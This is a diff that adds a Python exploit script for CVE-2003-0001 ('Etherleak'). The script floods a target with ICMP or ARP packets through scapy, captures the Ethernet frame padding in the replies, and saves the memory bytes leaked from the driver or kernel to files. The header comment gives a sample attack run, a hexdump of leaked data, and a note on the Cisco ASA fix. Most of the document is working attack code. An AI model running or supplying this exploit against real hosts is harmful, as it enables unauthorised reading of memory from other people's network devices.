@@ -1,0 +1,94 @@
+#!/usr/bin/env python
+# CVE-2003-0001 'Etherleak' exploit
+# =================================
+# Exploit for hosts which use a network device driver that pads 
+# ethernet frames with data which vary from one packet to another, 
+# likely taken from kernel memory, system memory allocated to 
+# the device driver, or a hardware buffer on its network interface 
+# card. Exploit uses scapy with either ICMP or ARP requests as 
+# this can trigger with either but ICMP can hit layer3 filtering 
+# rules. Using ARP the padding appears to leak only fixed constant 
+# values when exploited, ICMP leaks random bytes. 
+#
+# root@bt:~/0d# python cve-2003-0001.py x.x.x.254 icmp leaky
+# WARNING: No route found for IPv6 destination :: (no default route?)
+# [ CVE-2003-0001 'Etherleak' exploit
+# [ Attacking x.x.x.254 for icmp padding saved to leaky.hex
+# ............................................................^C!Killing
+# !Killing
+# root@bt:~/0d# hexdump -C leaky | head
+# 00000000  e6 bd a6 9b 90 eb 44 f5  18 a5 29 2a 16 5a 08 ff  |......D...)*.Z..|
+# 00000010  43 e1 23 07 8f 96 5a 24  3f 3d 33 7d b4 97 7e 18  |C.#...Z$?=3}..~.|
+# 00000020  05 c9 7c 2c a5 c0 fa 7a  76 f3 51 c0 fe 07 72 32  |..|,...zv.Q...r2|
+# 00000030  9e ad 6a 67 ad 43 58 17  60 43 bc 2b b8 fb cc 70  |..jg.CX.`C.+...p|
+# 00000040  99 92 80 84 03 03 6f 8f  18 d3 5b 5e f0 1e 3a 83  |......o...[^..:.|
+# 00000050  3d 82 e7 cd 3e 1f 31 74  b0 06 8c a2 7e 14 6b fb  |=...>.1t....~.k.|
+# 00000060  72 9b ac 64 74 9b a4 d9  23 5b 92 82 0d 0b 31 f0  |r..dt...#[....1.|
+# 00000070  a9 4f dd 3f bf 2b 5c 67  6c 22 fa da d0 2b d6 39  |.O.?.+\gl"...+.9|
+# 00000080  40 58 13 4f 3d bb 48 03  d3 53 3c 5c 44 d2 3d b2  |@X.O=.H..S<\D.=.|
+# 00000090  4f f2 a9 4a 02 80 4e 1b  6c bd 69 89 bd 76 1b 0a  |O..J..N.l.i..v..|
+#
+# This issue has been resolved in ASA 8.4.4.6/8.2.5.32. Cisco Bug reference
+# is CSCua88376 and PSIRT-0669464365.
+#
+#  -- prdelka
+#
+import os
+import sys
+import signal
+import binascii
+from scapy.all import *
+
+def signalhandler(signal,id):
+	print "!Killing"
+	sys.exit(0)
+
+def spawn(host,type):
+	if type == 'arp':
+		send(ARP(pdst=host),loop=1,nofilter=1)
+	elif type == 'icmp':
+		send(IP(dst=host)/ICMP(type=8)/'x',loop=1,nofilter=1)		
+
+if __name__ == "__main__":
+	print "[ CVE-2003-0001 'Etherleak' exploit"
+	signal.signal(signal.SIGINT,signalhandler)
+	if len(sys.argv) < 4:
+		print "[ No! Use with <host> <arp|icmp> <file>"
+		sys.exit(1)
+	type = sys.argv[2]
+	if type == 'arp':
+		pass
+	elif type == 'icmp':
+		pass
+	else:
+		print "Bad type!"
+		sys.exit(0)
+	pid = os.fork()
+	if(pid):
+		print "[ Attacking %s for %s padding saved to %s.hex" % (sys.argv[1],sys.argv[2],sys.argv[3])
+		spawn(sys.argv[1],sys.argv[2])
+	while True:
+		if type == 'arp':
+			myfilter = "host %s and arp" % sys.argv[1]
+		elif type == 'icmp':
+			myfilter = "host %s and icmp" % sys.argv[1]
+		x = sniff(count=1,filter=myfilter,lfilter=lambda x: x.haslayer(Padding))
+		p = x[0]
+		if type == 'arp':
+			pad = p.getlayer(2)
+		if type == 'icmp':
+			pad = p.getlayer(4)
+		leak =  str(pad)
+		hexfull = binascii.b2a_hex(leak)
+		file = "%s.hex"%sys.argv[3]
+		fdesc = open(file,"a")
+		fdesc.write(hexfull + "\n")
+		fdesc.close()
+		# 32 bits leaked here for me.
+		if type == 'icmp':
+			bytes = leak[9:13]
+		elif type == 'arp':
+			bytes = leak[10:14]
+		fdesc = open(sys.argv[3],"ab")
+		fdesc.write(bytes)
+		fdesc.close()
